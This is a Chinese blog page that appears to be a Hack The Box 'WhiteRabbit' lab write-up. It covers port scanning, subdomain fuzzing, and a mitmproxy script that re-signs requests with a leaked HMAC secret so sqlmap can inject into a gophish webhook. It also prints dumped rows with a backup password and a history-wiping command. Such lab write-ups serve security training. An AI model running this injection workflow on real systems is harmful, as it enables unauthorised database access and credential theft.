

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="https://avatars.githubusercontent.com/u/117073339?v=4">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="FSRM">
  <meta name="keywords" content="">
  
    <meta name="description" content="HTB-WhiteRabbit信息收集首先先将whiterabbit.htb添加到&#x2F;etc&#x2F;hosts中 然后利用rustscan进行扫一波 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950rustscan -a 10.10.11.63 --range 1-6553">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-WhiteRabbit">
<meta property="og:url" content="http://example.com/2025/04/06/HTB-WhiteRabbit/index.html">
<meta property="og:site_name" content="FSRM">
<meta property="og:description" content="HTB-WhiteRabbit信息收集首先先将whiterabbit.htb添加到&#x2F;etc&#x2F;hosts中 然后利用rustscan进行扫一波 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950rustscan -a 10.10.11.63 --range 1-6553">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070001330.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070000136.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071645578.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071651031.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071914563.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071915257.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071912733.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071913588.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072008593.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072015938.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072113734.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072115467.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072118118.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072120442.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072153182.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072157507.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072201062.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072207224.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072252972.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072253804.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072256820.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072258354.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072300396.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072307421.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072311916.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072327464.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343088.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343499.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072346591.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504080020571.png">
<meta property="article:published_time" content="2025-04-06T05:59:21.588Z">
<meta property="article:modified_time" content="2025-04-08T12:22:45.745Z">
<meta property="article:author" content="FSRM">
<meta property="article:tag" content="HTB">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070001330.png">
  
  
  
  <title>HTB-WhiteRabbit - FSRM</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yo4o5RmdPYW9bP2LZP2uPFV1-MdYXbMMI","app_key":"ibpxtrAlbUHYQ8KOkGrFgWss","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>FSRM</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://haowallpaper.com/link/common/file/previewFileImg/17231683527757184') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB-WhiteRabbit"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-04-06 13:59" pubdate>
          2025年4月6日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          62 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB-WhiteRabbit</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="HTB-WhiteRabbit"><a href="#HTB-WhiteRabbit" class="headerlink" title="HTB-WhiteRabbit"></a>HTB-WhiteRabbit</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先先将whiterabbit.htb添加到/etc/hosts中</p>
<p>然后利用rustscan进行扫一波</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rustscan</span> -a <span class="hljs-number">10.10.11.63</span> --range <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -- -sV<span class="hljs-meta"></span><br><span class="hljs-meta">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="hljs-meta">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="hljs-meta">Open 10.10.11.63:22</span><br><span class="hljs-meta">Open 10.10.11.63:80</span><br><span class="hljs-meta">Open 10.10.11.63:2222</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">[~] Starting Nmap</span><br><span class="hljs-meta">[&gt;] The Nmap command to be run is nmap -sV -vvv -p 22,80,2222 10.10.11.63</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 06:06 UTC</span><br><span class="hljs-meta">NSE: Loaded 46 scripts for scanning.</span><br><span class="hljs-meta">Initiating Ping Scan at 06:06</span><br><span class="hljs-meta">Scanning 10.10.11.63 [4 ports]</span><br><span class="hljs-attribute">Stats</span>: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">1</span> undergoing Ping Scan<br><span class="hljs-attribute">Ping</span> Scan Timing: About <span class="hljs-number">100</span>.<span class="hljs-number">00</span>% done; ETC: <span class="hljs-number">06</span>:<span class="hljs-number">06</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)<br><span class="hljs-attribute">Completed</span> Ping Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">0</span>.<span class="hljs-number">36</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br><span class="hljs-attribute">Initiating</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">13</span>.<span class="hljs-number">00</span>s elapsed<br><span class="hljs-attribute">DNS</span> resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">13</span>.<span class="hljs-number">01</span>s. Mode: Async<span class="hljs-meta"> [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]</span><br><span class="hljs-attribute">Initiating</span> SYN Stealth Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">10.10.11.63</span><span class="hljs-meta"> [3 ports]</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">2222</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Completed</span> SYN Stealth Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">3</span>.<span class="hljs-number">01</span>s elapsed (<span class="hljs-number">3</span> total ports)<br><span class="hljs-attribute">Initiating</span> Service scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">3</span> services <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Completed</span> Service scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">6</span>.<span class="hljs-number">92</span>s elapsed (<span class="hljs-number">3</span> services <span class="hljs-literal">on</span> <span class="hljs-number">1</span> host)<br><span class="hljs-attribute">NSE</span>: Script scanning <span class="hljs-number">10.10.11.63</span>.<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">1</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">4</span>.<span class="hljs-number">49</span>s elapsed<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">2</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">1</span>.<span class="hljs-number">85</span>s elapsed<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Host</span> is up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0</span>.<span class="hljs-number">33</span>s latency).<br><span class="hljs-attribute">Scanned</span> at <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">06</span> <span class="hljs-number">06</span>:<span class="hljs-number">06</span>:<span class="hljs-number">19</span> UTC for <span class="hljs-number">17</span>s<br><br><span class="hljs-attribute">PORT</span>     STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">22</span>/tcp   open  ssh     syn-ack ttl <span class="hljs-number">63</span> OpenSSH <span class="hljs-number">9</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">9</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp   open  http    syn-ack ttl <span class="hljs-number">62</span> Caddy httpd<br><span class="hljs-attribute">2222</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">62</span> OpenSSH <span class="hljs-number">9</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">5</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br><span class="hljs-attribute">Read</span> data files from: /usr/bin/../share/nmap<br><span class="hljs-attribute">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">30</span>.<span class="hljs-number">91</span> seconds<br>           <span class="hljs-attribute">Raw</span> packets sent: <span class="hljs-number">10</span> (<span class="hljs-number">416</span>B) | Rcvd: <span class="hljs-number">5</span> (<span class="hljs-number">212</span>B)<br></code></pre></td></tr></table></figure>

<p>开放22 80和 2222端口</p>
<p>利用dirsearch扫后台也没什么东西，下面利用ffuf尝试爆破一下子域名。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -w subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://whiterabbit.htb -H <span class="hljs-string">&quot;Host:FUZZ.whiterabbit.htb&quot;</span> -mc <span class="hljs-number">200</span>,<span class="hljs-number">302</span> -fs <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070001330.png" srcset="/img/loading.gif" lazyload alt="image-20250407000104188"></p>
<p>接着扫新域名的目录信息。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070000136.png" srcset="/img/loading.gif" lazyload alt="image-20250407000042989"></p>
<p>再status目录下扫到temp</p>
<p>里面又存放着其他的子域名。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071645578.png" srcset="/img/loading.gif" lazyload alt="image-20250407164515349"></p>
<p>加到/etc/hosts中</p>
<p>再wikijs中再次发现一个新的子域名，接着添加。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071651031.png" srcset="/img/loading.gif" lazyload alt="image-20250407165124861"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这个地方有一个json的文件，下载下来。</p>
<p>让ai大概分析一下，其中比较重要的点就是它首先会检查x-gophish-signature 也即是签名的正确性，这个签名是根据secret和请求体进行加密的，当请求体发生变化的时候，签名就会生效，需要新的签名。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071914563.png" srcset="/img/loading.gif" lazyload alt="image-20250407191447386"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071915257.png" srcset="/img/loading.gif" lazyload alt="image-20250407191507124"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071912733.png" srcset="/img/loading.gif" lazyload alt="image-20250407191244407"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071913588.png" srcset="/img/loading.gif" lazyload alt="image-20250407191310430"></p>
<h2 id="中间代理签名"><a href="#中间代理签名" class="headerlink" title="中间代理签名"></a>中间代理签名</h2><p>这个email存在sql注入点，而secret我们是知道的，所以利用sqlmap进行跑的时候需要不断更新签名的内容。</p>
<p>利用mitmproxy 中间人代理的一个工具，劫持每一个从sqlmap发出去的包，然后经过签名之后再发送出去。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># gophish_sign.py</span><br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> http<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><br>SECRET = <span class="hljs-string">b&quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">flow: http.HTTPFlow</span>):<br>    <span class="hljs-keyword">if</span> flow.request.path.startswith(<span class="hljs-string">&quot;/webhook/&quot;</span>) <span class="hljs-keyword">and</span> flow.request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            raw_data = flow.request.get_content()<br>            signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()<br>            flow.request.headers[<span class="hljs-string">&quot;x-gophish-signature&quot;</span>] = <span class="hljs-string">f&quot;sha256=<span class="hljs-subst">&#123;signature&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            flow.request.headers[<span class="hljs-string">&quot;x-gophish-signature&quot;</span>] = <span class="hljs-string">&quot;error-signing&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span> \<br>  <span class="hljs-params">--data=</span>&#x27;&#123;<span class="hljs-string">&quot;campaign_id&quot;</span><span class="hljs-function">:1</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Clicked Link&quot;</span>&#125;&#x27; \<br>  <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  <span class="hljs-params">--proxy=</span><span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span> \<br>  <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> \<br>  <span class="hljs-params">--technique=BE</span> <span class="hljs-params">--time-sec=3</span> <span class="hljs-params">--dbs</span><br><br>sqlmap -u <span class="hljs-string">&quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span> \<br>  <span class="hljs-params">--data=</span>&#x27;&#123;<span class="hljs-string">&quot;campaign_id&quot;</span><span class="hljs-function">:1</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Clicked Link&quot;</span>&#125;&#x27; \<br>  <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  <span class="hljs-params">--proxy=</span><span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span> \<br>  <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> \<br>  <span class="hljs-params">--technique=BE</span> <span class="hljs-params">--time-sec=3</span> -D phishing <span class="hljs-params">--tables</span><br>  <br>  mitmproxy -s gophish_sign.py <span class="hljs-params">--mode</span> regular <span class="hljs-params">--listen-port</span> 9999<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072008593.png" srcset="/img/loading.gif" lazyload alt="image-20250407200836484"></p>
<p>再temp数据库下发现日志的信息。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072015938.png" srcset="/img/loading.gif" lazyload alt="image-20250407201548868"></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+---------------------+------------------------------------------------------------------------------+----+<br>|<span class="hljs-string"> date                </span>|<span class="hljs-string"> command                                                                      </span>|<span class="hljs-string"> id </span>|<br>+---------------------+------------------------------------------------------------------------------+----+<br>|<span class="hljs-string"> 2024-08-30 10:44:01 </span>|<span class="hljs-string"> uname -a                                                                     </span>|<span class="hljs-string"> 1  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:58:05 </span>|<span class="hljs-string"> restic init --repo rest:http://75951e6ff.whiterabbit.htb                     </span>|<span class="hljs-string"> 2  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:58:36 </span>|<span class="hljs-string"> echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       </span>|<span class="hljs-string"> 3  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:59:02 </span>|<span class="hljs-string"> rm -rf .bash_history                                                         </span>|<span class="hljs-string"> 4  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:59:47 </span>|<span class="hljs-string"> #thatwasclose                                                                </span>|<span class="hljs-string"> 5  </span>|<br>|<span class="hljs-string"> 2024-08-30 14:40:42 </span>|<span class="hljs-string"> cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator </span>|<span class="hljs-string"> passwd </span>|<span class="hljs-string"> 6  </span>|<br>+---------------------+------------------------------------------------------------------------------+----+<br></code></pre></td></tr></table></figure>

<h2 id="restic"><a href="#restic" class="headerlink" title="restic"></a>restic</h2><p>主要是这个restic.</p>
<p>Restic 是<strong>一个免费的，快速，开源，安全和跨平台的备份程序</strong>，使用 go 编程语言编写，使用 AES-256 对数据进行加密，并使用 Poly1305-AES 对数据进行身份验证。 Restic 是一个快速且安全的数据文件备份程序。</p>
<p>我们知道了密码，就能从远程仓库上下载文件。</p>
